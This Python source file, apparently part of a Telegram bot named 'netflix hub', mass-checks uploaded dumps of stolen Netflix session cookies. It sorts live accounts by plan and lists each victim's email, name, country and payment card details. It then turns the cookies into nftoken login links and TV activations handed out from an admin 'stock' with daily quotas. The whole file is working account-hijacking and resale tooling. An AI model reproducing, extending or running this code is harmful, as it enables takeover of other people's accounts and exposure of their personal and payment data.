        with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                base = os.path.basename(info.filename)
                if not base or base.startswith("."):
                    continue
                low = base.lower()
                if not (low.endswith((".txt", ".json", ".cookies", ".log")) or "cookie" in low):
                    # still try small text files
                    if info.file_size > 2_000_000:
                        continue
                try:
                    raw = zf.read(info)
                    # multi-account split for netscape dumps
                    text_u = raw.decode("utf-8", errors="ignore")
                    if text_u.count("NetflixId") > 1 and "\t" in text_u:
                        blocks = re.split(r"\n\s*\n+", text_u)
                        n = 0
                        for i, block in enumerate(blocks):
                            if "NetflixId" not in block and "SecureNetflixId" not in block:
                                continue
                            cc = netscape_to_list(block) or parse_cookie_file(block.encode(), f"{base}#{i}")
                            if cc:
                                n += 1
                                items.append((f"{base}#{n}", cc))
                        if n:
                            continue
                    c = parse_cookie_file(raw, base)
                    if c:
                        items.append((base, c))
                except Exception:
                    pass
        return items

    text_u = file_bytes.decode("utf-8", errors="ignore")
    # multi NetflixId blocks
    if text_u.count("NetflixId") > 1:
        blocks = re.split(r"\n\s*\n+", text_u)
        for i, block in enumerate(blocks):
            if "NetflixId" not in block and "SecureNetflixId" not in block:
                continue
            cc = netscape_to_list(block) if "\t" in block else parse_cookie_file(block.encode(), f"{filename}#{i}")
            if not cc:
                cc = parse_cookie_file(block.encode(), f"{filename}#{i}")
            if cc:
                items.append((f"{filename}#{i+1}", cc))
        if items:
            return items
    c = parse_cookie_file(file_bytes, filename)
    if c:
        items.append((filename, c))
    return items



# ═══════════════════ HANDLERS ═══════════════════
def handle_start(chat_id, user_id):
    text = (
        "🎬 <b>netflix hub</b>\n"
        "<blockquote>────────────────</blockquote>\n"
        "🔍 <b>check cookies</b> — zip/txt · live progress · hits by plan\n"
        "🔗 <b>get login</b> — plan → account + pc/mobile/tv buttons\n"
        "📺 <b>tv login</b> — plan → send code → auto activate\n"
        "<blockquote>────────────────</blockquote>\n"
        f"daily login limit: <b>{DAILY_LINK_LIMIT}</b>\n"
        "<blockquote>use the keyboard below</blockquote>"
    )
    send_message(chat_id, text, reply_markup=main_menu_kb(user_id))


def handle_help(chat_id, user_id):
    send_message(
        chat_id,
        "ℹ️ <b>Help</b>\n\n"
        "• Send ZIP/TXT anytime to check cookies\n"
        "• After check: plan TXT files + ZIP + link buttons\n"
        "• Get Login uses admin stock (nftoken format)\n"
        "• TV Login: open netflix.com/tv2 on TV → enter code here\n"
        f"• Limit: {DAILY_LINK_LIMIT} logins/day\n",
        reply_markup=main_menu_kb(user_id),
    )


def handle_my_limit(chat_id, user_id):
    used = user_daily_count(user_id)
    send_message(
        chat_id,
        f"📊 Today: <b>{used}</b> / <b>{DAILY_LINK_LIMIT}</b> login links",
        reply_markup=main_menu_kb(user_id),
    )


def handle_live_hits(chat_id, user_id):
    with hits_lock:
        hits = live_hits.get(user_id, [])
    if not hits:
        send_message(chat_id, "No hits yet. Check cookies first.")
        return
    lines = [f"🔥 <b>Hits ({len(hits)})</b>\n"]
    for h in hits[-25:]:
        extra = " | Extra" if h.get("extra_members") else ""
        lines.append(f"• [{h.get('country','?')}] {h.get('email','?')} — <b>{h.get('plan','?')}</b>{extra}")
    send_message(chat_id, "\n".join(lines))


def handle_get_login_start(chat_id, user_id):
    used = user_daily_count(user_id)
    if used >= DAILY_LINK_LIMIT and not is_admin(user_id):
        send_message(chat_id, f"⛔ Daily limit reached ({DAILY_LINK_LIMIT}). Try tomorrow.")
        return
    send_message(
        chat_id,
        f"🔗 <b>get login</b>\n<blockquote>used today: {used}/{DAILY_LINK_LIMIT}</blockquote>\nchoose plan:",
        reply_markup=plan_inline("login"),
    )


def handle_tv_login_start(chat_id, user_id):
    used = user_daily_count(user_id)
    if used >= DAILY_LINK_LIMIT and not is_admin(user_id):
        send_message(chat_id, f"⛔ Daily limit reached ({DAILY_LINK_LIMIT}).")
        return
    send_message(
        chat_id,
        "📺 <b>tv login</b>\n<blockquote>1) open netflix on tv → enter code</blockquote>\n"
        "2) Choose plan below\n3) Send the code here\n",
        reply_markup=plan_inline("tvplan"),
    )


def deliver_login(chat_id, user_id, plan_key: str):
    msg_id = send_message(
        chat_id,
        f"⏳ <b>fetching {plan_key}</b>\n<blockquote>checking live cookie + generating nftoken…</blockquote>",
    )
    taken = take_from_store(plan_key, need_token=True)
    if not taken:
        edit_message(
            chat_id, msg_id,
            f"❌ <b>no live {plan_key}</b>\n<blockquote>admin must upload stock first</blockquote>",
        )
        return
    res = taken["check"]
    jar = cookies_to_dict(res.get("cookies") or [])
    nid = res.get("netflix_id") or jar.get("NetflixId")
    sec = jar.get("SecureNetflixId")
    res["netflix_id"] = nid

    # Always try token with NetflixId + SecureNetflixId
    tok = res.get("token")
    if not tok and nid:
        for _ in range(3):
            tok = generate_nftoken(nid, secure_id=sec, extra_cookies=jar)
            if tok:
                break
            time.sleep(0.7)
    if tok:
        links = build_nftoken_links(tok)
        res["token"] = tok
        res["login_pc"] = links["pc"]
        res["login_mobile"] = links["mobile"]
        res["login_tv"] = links["tv"]
        res["login_home"] = links.get("home")

    if not is_admin(user_id):
        inc_user_daily(user_id)

    card = format_account_card(res)
    markup = None
    long_links = False
    if res.get("login_pc"):
        def _u(u):
            u = u or ""
            if not u.startswith("http"):
                return None
            if len(u) > 1800:
                return "LONG"
            return u
        rows = []
        pc = _u(res.get("login_pc"))
        mob_web = _u(res.get("login_mobile_web") or res.get("mobile_web"))
        # intent:// not allowed in Telegram URL buttons — only https
        if pc and pc != "LONG":
            rows.append([{"text": "🖥 pc login", "url": pc}])
        if mob_web and mob_web != "LONG":
            rows.append([{"text": "📱 mobile web link", "url": mob_web}])
        if pc == "LONG" or mob_web == "LONG":
            long_links = True
        if rows:
            markup = {"inline_keyboard": rows}
    else:
        card += "\n\n<blockquote>nftoken failed — cookie still valid, try get login again or use tv login</blockquote>"

    ok = edit_message(chat_id, msg_id, card, reply_markup=markup)
    if not ok:
        send_message(chat_id, card, reply_markup=markup)

    # If links too long for URL buttons, send clickable HTML links
    if long_links or (res.get("login_pc") and not markup):
        send_message(
            chat_id,
            "🔗 <b>tap links</b>\n"
            f"<blockquote>pc</blockquote>\n<a href=\"{res.get('login_pc')}\">open pc login</a>\n\n"
            f"<blockquote>mobile web</blockquote>\n<a href=\"{res.get('login_mobile_web') or res.get('login_mobile')}\">open mobile login</a>\n\n"
            f"<blockquote>for tv use 📺 tv login button</blockquote>",
        )

    # Always send full links as document (works even if URL button too long)
    if res.get("login_pc"):
        body = (
            f"{'═'*28}\n"
            f"email: {res.get('email')}\n"
            f"plan: {res.get('plan')}\n"
            f"country: {res.get('country')}\n"
            f"name: {res.get('name')}\n"
            f"price: {res.get('price')}\n"
            f"payment: {res.get('pay_type') or res.get('card_brand')}\n"
            f"{'═'*28}\n\n"
            f"pc:\n{res.get('login_pc')}\n\n"
            f"mobile_app_intent:\n{res.get('login_mobile')}\n\n"
            f"mobile_web:\n{res.get('login_mobile_web') or ''}\n\n"
            f"(tv: use tv login in bot)\n"
        )
        send_document(chat_id, body.encode("utf-8"), f"login_{plan_key}.txt", "🔗 full login links\n<blockquote>⚠️ links expire in ~2 hours — open soon</blockquote>")
        # Mobile open-in-app instructions (intent cannot be a Telegram URL button)
        mob_intent = res.get("login_mobile") or ""
        mob_web = res.get("login_mobile_web") or ""
        if mob_intent.startswith("intent:"):
            send_message(
                chat_id,
                "📱 <b>mobile — open in netflix app</b>\n"
                "<blockquote>1) copy the intent link from the txt / below\n"
                "2) paste in chrome address bar → enter\n"
                "3) chrome asks open with netflix → allow</blockquote>\n\n"
                f"<code>{mob_intent[:3500]}</code>\n\n"
                f"fallback web:\n<code>{mob_web[:500]}</code>",
            )
        elif mob_web:
            send_message(
                chat_id,
                "📱 <b>mobile</b>\n<blockquote>open this in chrome (not telegram in-app browser)</blockquote>\n"
                f"<code>{mob_web[:3500]}</code>",
            )
        send_message(
            chat_id,
            "🖥 <b>pc login tip</b>\n"
            "<blockquote>1) open pc link on computer chrome / edge\n"
            "2) do not use telegram in-app browser\n"
            "3) if already logged in another netflix account — use incognito\n"
            "4) link expires in ~2 hours</blockquote>",
        )
    elif nid:
        send_message(
            chat_id,
            f"⚠️ <b>token not generated</b>\n<blockquote>email: {res.get('email')} — try get login again</blockquote>",
        )



def start_tv_wait(chat_id, user_id, plan_key: str):
    taken = take_from_store(plan_key, need_token=False)
    if not taken:
        send_message(chat_id, f"❌ No live <b>{plan_key}</b> in store.")
        return
    with state_lock:
        pending_state[user_id] = {
            "mode": "tv_code",
            "plan": plan_key,
            "cookies": taken["check"]["cookies"],
            "entry_id": taken["entry"].get("id"),
            "email": taken["check"].get("email"),
        }
    if not is_admin(user_id):
        inc_user_daily(user_id)
    send_message(
        chat_id,
        f"📺 Plan <b>{plan_key}</b> reserved ({taken['check'].get('email')}).\n"
        "Send the <b>TV code</b> now (from netflix.com/tv2 on your TV).",
        reply_markup=kb([[btn("❌ Cancel TV", "cancel_tv")]]),
    )


def handle_tv_code(chat_id, user_id, code: str):
    with state_lock:
        st = pending_state.get(user_id)
    if not st or st.get("mode") != "tv_code":
        send_message(chat_id, "No TV session. Use 📺 TV Login.")
        return
    mid = send_message(chat_id, "⏳ Activating TV code…")
    ok, msg = activate_tv_code(st["cookies"], code)
    with state_lock:
        pending_state.pop(user_id, None)
    if ok:
        edit_message(chat_id, mid, f"✅ <b>{msg}</b>\n\nemail: <code>{st.get('email')}</code>\n<blockquote>open netflix on your tv — you should be signed in</blockquote>")
    else:
        edit_message(chat_id, mid, f"❌ {msg}")


def handle_admin_panel(chat_id, user_id):
    if not is_admin(user_id):
        send_message(chat_id, "⛔ Admin only.")
        return
    send_message(chat_id, "🛠 <b>Admin Panel</b>\n" + store_stats(), reply_markup=admin_menu_kb())


def handle_admin_upload_prompt(chat_id, user_id):
    if not is_admin(user_id):
        return
    with state_lock:
        pending_state[user_id] = {"mode": "admin_upload"}
    send_message(chat_id, "📤 Send ZIP/TXT of cookies to add to <b>stock store</b>.")


def handle_clear_store(chat_id, user_id):
    if not is_admin(user_id):
        return
    save_store({"premium": [], "standard": [], "basic": [], "mobile": [], "other": []})
    send_message(chat_id, "🧹 Store cleared.", reply_markup=admin_menu_kb())


def run_check_job(chat_id, user_id, file_bytes, fname, status_mid, to_store: bool = False):
    items = load_cookies_from_upload(file_bytes, fname)
    if not items:
        edit_message(chat_id, status_mid, "❌ No valid cookies found.")
        with jobs_lock:
            user_jobs.pop(user_id, None)
        return
    total = len(items)
    edit_message(chat_id, status_mid, f"✅ Loaded <b>{total}</b>\n🚀 {MAX_THREADS} threads…",
                 reply_markup=kb([[btn("🔥 Live Hits", "live_hits")]]))

    start_t = time.time()
    counters = {"done": 0, "working": 0, "expired": 0, "errors": 0}
    current_label = {"v": items[0][0]}
    working_results = []
    seen_fp = set()
    lock = Lock()
    last_edit = {"t": 0.0}
    stop = threading.Event()

    def worker(label, cookies):
        with jobs_lock:
            if user_jobs.get(user_id, {}).get("cancel"):
                return
        current_label["v"] = label
        res = check_one_cookie(cookies, label, need_token=False)
        with lock:
            counters["done"] += 1
            if res["status"] == "working":
                fp = cookie_fingerprint(cookies)
                if fp and fp in seen_fp:
                    counters["expired"] += 1
                else:
                    if fp:
                        seen_fp.add(fp)
                    counters["working"] += 1
                    working_results.append(res)
                    with hits_lock:
                        live_hits.setdefault(user_id, []).append({
                            "email": res.get("email"), "plan": res.get("plan"),
                            "country": res.get("country"), "extra_members": res.get("extra_members"),
                        })
            elif res["status"] == "expired":
                counters["expired"] += 1
            else:
                counters["errors"] += 1

    def progress_loop():
        while not stop.is_set():
            now = time.time()
            if now - last_edit["t"] >= 1.0:
                last_edit["t"] = now
                edit_message(
                    chat_id, status_mid,
                    format_progress(counters["done"], total, counters["working"], counters["expired"],
                                    counters["errors"], current_label["v"], now - start_t),
                    reply_markup=kb([[btn("🔥 Live Hits", "live_hits")]]),
                )
            time.sleep(1.0)

    threading.Thread(target=progress_loop, daemon=True).start()
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        futs = [ex.submit(worker, lab, cks) for lab, cks in items]
        for _ in as_completed(futs):
            with jobs_lock:
                if user_jobs.get(user_id, {}).get("cancel"):
                    break
    stop.set()

    with jobs_lock:
        user_jobs[user_id] = {"done": True, "working_results": working_results}

    elapsed = time.time() - start_t
    by_plan: Dict[str, List] = {}
    countries: Dict[str, int] = {}
    for h in working_results:
        pk = h.get("plan_key") or "other"
        by_plan.setdefault(pk, []).append(h)
        cc = (h.get("country") or "XX").upper()
        countries[cc] = countries.get(cc, 0) + 1
    top_c = sorted(countries.items(), key=lambda x: -x[1])[:10]
    c_lines = "\n".join(f"  <code>{c}</code>: {n}" for c, n in top_c)
    summary = (
        f"✅ <b>Check complete</b>\n\n📦 Total: <b>{total}</b>\n✅ Working: <b>{counters['working']}</b>\n"
        f"❌ Expired: <b>{counters['expired']}</b>\n⚠️ Errors: <b>{counters['errors']}</b>\n"
        f"⏱ {int(elapsed)}s\n\n🌍 Countries:\n{c_lines or '—'}"
    )
    if to_store and is_admin(user_id):
        counts = store_add_working(working_results)
        summary += (
            f"\n\n📤 <b>stock update</b>\n"
            f"• premium: <b>{counts.get('premium',0)}</b>\n"
            f"• standard: <b>{counts.get('standard',0)}</b>\n"
            f"• basic: <b>{counts.get('basic',0)}</b>\n"
            f"• mobile: <b>{counts.get('mobile',0)}</b>\n"
            f"• other: <b>{counts.get('other',0)}</b>\n"
            f"total added: <b>{counts.get('total',0)}</b>"
        )

    rows = [[btn("🔗 Generate Links (batch)", "gen_links_batch"), btn("📄 All Hits TXT", "all_hits_txt")]]
    for pk, lst in by_plan.items():
        rows.append([btn(f"📄 {pk.title()} ({len(lst)})", f"plan_txt:{pk}")])
    rows.append([btn("🔥 Live Hits", "live_hits")])
    edit_message(chat_id, status_mid, summary, reply_markup=kb(rows))

    # plan-separated TXT + full ZIP
    if working_results:
        # one TXT per plan with full info (no token yet — use gen links)
        for pk, lst in by_plan.items():
            buf = io.StringIO()
            for h in lst:
                buf.write(f"Email: {h.get('email')}\nPlan: {h.get('plan')}\nCountry: {h.get('country')}\n")
                buf.write(f"Extra: {h.get('extra_members')}\nName: {h.get('name')}\nPrice: {h.get('price')}\n")
                buf.write(f"Cookie: {cookies_to_header(h['cookies'])}\n\n")
            send_document(chat_id, buf.getvalue().encode(), f"hits_{pk}.txt", f"📄 {pk.title()} — {len(lst)} accounts")

        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
            for i, h in enumerate(working_results):
                safe = re.sub(r'[<>:"/\\|?*]', "_", h.get("email") or "x")
                name = f"{i:03d}_[{h.get('country')}] [{safe}] - {h.get('plan')}.json"
                payload = list(h["cookies"]) + [{"_meta": {k: h.get(k) for k in ("plan", "email", "country", "extra_members", "price")}}]
                zf.writestr(name, json.dumps(payload, indent=2, ensure_ascii=False))
        zip_buf.seek(0)
        send_document(chat_id, zip_buf.read(), "working_netflix_cookies.zip", f"✅ {len(working_results)} working")


def gen_links_for_results(chat_id, user_id):
    """Generate nftoken links for ALL working accounts from last check."""
    with jobs_lock:
        working = (user_jobs.get(user_id) or {}).get("working_results") or []
    if not working:
        send_message(chat_id, "No hits in last check.")
        return
    total = len(working)
    mid = send_message(chat_id, f"⏳ Generating nftoken links for <b>all {total}</b> accounts…")
    lines = []
    ok = 0
    fail = 0
    # Progress every N accounts
    for i, h in enumerate(working, 1):
        jar = cookies_to_dict(h.get("cookies") or [])
        nid = h.get("netflix_id") or jar.get("NetflixId")
        sec = jar.get("SecureNetflixId")
        tok = generate_nftoken(nid, secure_id=sec, extra_cookies=jar) if nid else None
        if not tok:
            fail += 1
            lines.append(
                f"═══ {h.get('email')} | {h.get('plan')} | {h.get('country')} ═══\n"
                f"TOKEN: FAILED\nCookie: {cookies_to_header(h.get('cookies') or [])}\n\n"
            )
            if i % 10 == 0 or i == total:
                edit_message(chat_id, mid, f"⏳ Links {i}/{total} — ok {ok} fail {fail}")
            continue
        links = build_nftoken_links(tok)
        ok += 1
        block = (
            f"═══ {h.get('email')} | {h.get('plan')} | {h.get('country')} ═══\n"
            f"Name: {h.get('name') or '—'}\n"
            f"Price: {h.get('price') or '—'}\n"
            f"Extra: {h.get('extra_members')}\n"
            f"PC: {links['pc']}\n"
            f"Mobile: {links['mobile']}\n"
            
            f"Cookie: {cookies_to_header(h.get('cookies') or [])}\n\n"
        )
        lines.append(block)
        # Send every account as chat card with URL buttons
        markup = {
            "inline_keyboard": [
                [{"text": "🖥 PC Login", "url": links["pc"][:2000]}],
                [{"text": "📱 Mobile", "url": (links.get("mobile_web") or links["mobile"])[:2000]}],
            ]
        }
        extra = " | Extra" if h.get("extra_members") else ""
        pay = h.get("pay_type") or h.get("card_brand") or "—"
        if h.get("card_last4"):
            pay = f"{pay} {h.get('card_last4')}"
        send_message(
            chat_id,
            f"✅ <b>{ok}</b>/{total}\n"
            f"email: <code>{h.get('email')}</code>\n"
            f"plan: <b>{h.get('plan')}</b> | country: <code>{h.get('country')}</code>{extra}\n"
            f"name: {h.get('name') or '—'} | price: {h.get('price') or '—'}\n"
            f"payment: {pay} | quality: {h.get('video_quality') or '—'}\n"
            f"<blockquote>pc · mobile · expires ~2h</blockquote>",
            reply_markup=markup,
        )
        if i % 5 == 0 or i == total:
            edit_message(chat_id, mid, f"⏳ Links {i}/{total} — ok {ok} fail {fail}")
        time.sleep(0.05)  # soft rate limit

    if lines:
        send_document(
            chat_id,
            "".join(lines).encode("utf-8"),
            "login_links_ALL.txt",
            f"🔗 All accounts: {ok} links, {fail} failed (full TXT)",
        )
        edit_message(
            chat_id, mid,
            f"✅ Done. Links for <b>{ok}</b>/{total} accounts (all posted + full TXT). Fail: {fail}",
        )
    else:
        edit_message(chat_id, mid, "❌ Could not generate any nftokens.")


def send_plan_txt(chat_id, user_id, plan_key):
    with jobs_lock:
        working = (user_jobs.get(user_id) or {}).get("working_results") or []
    lst = [h for h in working if (h.get("plan_key") or "other") == plan_key]
    if not lst:
        send_message(chat_id, "No hits for that plan.")
        return
    buf = io.StringIO()
    for h in lst:
        buf.write(f"Email: {h.get('email')}\nPlan: {h.get('plan')}\nCountry: {h.get('country')}\nExtra: {h.get('extra_members')}\n")
        buf.write(f"Cookie: {cookies_to_header(h['cookies'])}\n\n")
    send_document(chat_id, buf.getvalue().encode(), f"hits_{plan_key}.txt", f"📄 {plan_key} — {len(lst)}")


def send_all_hits_txt(chat_id, user_id):
    with jobs_lock:
        working = (user_jobs.get(user_id) or {}).get("working_results") or []
    if not working:
        send_message(chat_id, "No hits.")
        return
    buf = io.StringIO()
    for h in working:
        buf.write(f"Email: {h.get('email')}\nPlan: {h.get('plan')}\nCountry: {h.get('country')}\nExtra: {h.get('extra_members')}\n")
        buf.write(f"Cookie: {cookies_to_header(h['cookies'])}\n\n")
    send_document(chat_id, buf.getvalue().encode(), "all_hits.txt", f"📄 All hits — {len(working)}")


def handle_document(msg):
    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    doc = msg.get("document") or {}
    fname = doc.get("file_name") or "cookies.bin"
    if not any(fname.lower().endswith(ext) for ext in (".zip", ".txt", ".json", ".cookies")):
        send_message(chat_id, "Send .zip / .txt / .json")
        return

    with state_lock:
        st = pending_state.get(user_id) or {}
    to_store = st.get("mode") == "admin_upload" and is_admin(user_id)
    if to_store:
        with state_lock:
            pending_state.pop(user_id, None)

    with jobs_lock:
        if user_id in user_jobs and not user_jobs[user_id].get("done"):
            send_message(chat_id, "⏳ Job running. Send /cancel")
            return
        user_jobs[user_id] = {"done": False, "cancel": False, "working_results": []}
    with hits_lock:
        live_hits[user_id] = []

    status_mid = send_message(chat_id, "📥 Downloading…") or 0
    raw = download_file(doc["file_id"])
    if not raw:
        edit_message(chat_id, status_mid, "❌ Download failed")
        with jobs_lock:
            user_jobs.pop(user_id, None)
        return
    threading.Thread(
        target=run_check_job, args=(chat_id, user_id, raw, fname, status_mid, to_store), daemon=True
    ).start()


def handle_callback(cq):
    cq_id = cq["id"]
    data = cq.get("data") or ""
    msg = cq.get("message") or {}
    chat_id = msg.get("chat", {}).get("id")
    user_id = cq.get("from", {}).get("id")
    if not chat_id or not user_id:
        answer_callback(cq_id)
        return
    answer_callback(cq_id)

    if data == "live_hits":
        handle_live_hits(chat_id, user_id)
    elif data == "cancel_action" or data == "cancel_tv":
        with state_lock:
            pending_state.pop(user_id, None)
        send_message(chat_id, "Cancelled.", reply_markup=main_menu_kb(user_id))
    elif data.startswith("login:"):
        plan = data.split(":", 1)[1]
        deliver_login(chat_id, user_id, plan)
    elif data.startswith("tvplan:"):
        plan = data.split(":", 1)[1]
        start_tv_wait(chat_id, user_id, plan)
    elif data == "gen_links_batch":
        threading.Thread(target=gen_links_for_results, args=(chat_id, user_id), daemon=True).start()
    elif data.startswith("plan_txt:"):
        send_plan_txt(chat_id, user_id, data.split(":", 1)[1])
    elif data == "all_hits_txt":
        send_all_hits_txt(chat_id, user_id)


def handle_text(chat_id, user_id, text: str):
    t = text.strip()
    # pending TV code
    with state_lock:
        st = pending_state.get(user_id)
    if st and st.get("mode") == "tv_code":
        handle_tv_code(chat_id, user_id, t)
        return

    # keyboard buttons
    if t in ("/start", "◀️ Main Menu"):
        handle_start(chat_id, user_id)
    elif t == "ℹ️ Help" or t == "/help":
        handle_help(chat_id, user_id)
    elif t == "🔍 Check Cookies":
        send_message(chat_id, "📎 Send ZIP or TXT/JSON of Netflix cookies now.")
    elif t == "🔗 Get Login":
        handle_get_login_start(chat_id, user_id)
    elif t == "📺 TV Login":
        handle_tv_login_start(chat_id, user_id)
    elif t == "🔥 Live Hits":
        handle_live_hits(chat_id, user_id)
    elif t == "📊 My Limit":
        handle_my_limit(chat_id, user_id)
    elif t == "🛠 Admin Panel":
        handle_admin_panel(chat_id, user_id)
    elif t == "📤 Upload Stock":
        handle_admin_upload_prompt(chat_id, user_id)
    elif t == "📦 Store Stats":
        if is_admin(user_id):
            send_message(chat_id, store_stats(), reply_markup=admin_menu_kb())
    elif t == "🧹 Clear Store":
        handle_clear_store(chat_id, user_id)
    elif t.startswith("/cancel"):
        with jobs_lock:
            if user_id in user_jobs:
                user_jobs[user_id]["cancel"] = True
        with state_lock:
            pending_state.pop(user_id, None)
        send_message(chat_id, "🛑 Cancelled.", reply_markup=main_menu_kb(user_id))
    elif t.startswith("/hits"):
        handle_live_hits(chat_id, user_id)
    else:
        # maybe TV code without state
        if re.fullmatch(r"[A-Za-z0-9]{4,8}", t):
            send_message(chat_id, "Use 📺 TV Login first, then send code.")
        else:
            send_message(chat_id, "Use the keyboard or /start", reply_markup=main_menu_kb(user_id))


def process_update(upd):
    try:
        if "callback_query" in upd:
            handle_callback(upd["callback_query"])
            return
        msg = upd.get("message") or upd.get("edited_message")
        if not msg:
            return
        user_id = (msg.get("from") or {}).get("id")
        chat_id = msg.get("chat", {}).get("id")
        if not user_id or not chat_id:
            return
        if msg.get("document"):
            handle_document(msg)
        elif msg.get("text"):
            handle_text(chat_id, user_id, msg["text"])
    except Exception as e:
        log.exception("update: %s", e)


def main():
    me = api("getMe")
    if not me.get("ok"):
        print("Invalid token", me)
        raise SystemExit(1)
    log.info("Bot @%s online", me["result"].get("username"))
    api("setMyCommands", {"commands": [
        {"command": "start", "description": "Main menu"},
        {"command": "hits", "description": "Live hits"},
        {"command": "cancel", "description": "Cancel job"},
        {"command": "help", "description": "Help"},
    ]})
    offset = 0
    log.info("Polling…")
    while True:
        try:
            j = api("getUpdates", {
                "offset": offset, "timeout": 30,
                "allowed_updates": ["message", "callback_query"],
            }, timeout=40)
            if not j.get("ok"):
                time.sleep(2)
                continue
            for upd in j.get("result") or []:
                offset = upd["update_id"] + 1
                process_update(upd)
        except KeyboardInterrupt:
            break
        except Exception as e:
            log.error("poll: %s", e)
            time.sleep(3)


if __name__ == "__main__":
    main()
